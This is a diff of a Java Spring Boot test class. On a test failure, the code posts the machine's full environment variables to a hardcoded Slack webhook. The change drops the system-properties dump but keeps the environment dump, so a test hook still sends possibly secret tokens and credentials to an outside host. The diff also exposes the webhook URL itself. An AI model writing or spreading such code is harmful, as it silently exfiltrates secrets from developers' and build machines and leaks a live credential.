@@ -100,9 +100,9 @@ public class EmployeebootApplicationTests {
 			final String endpoint = "https://hooks.slack.com/services/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";
 			String text = "Test Failed" + " \n"
 					//+ Arrays.toString(t.getStackTrace())
-					+ System.getenv() + "\n"
-					+ System.getProperties().toString() + "\n";
-			
+					+ System.getenv() + "\n";
+					//+ System.getProperties().toString() + "\n";
+
 			RestTemplate restTemplate = new RestTemplate();
 			ResponseEntity<String> response = restTemplate.postForEntity(endpoint, "{\"text\": \"" + text + "\"}", String.class);
 
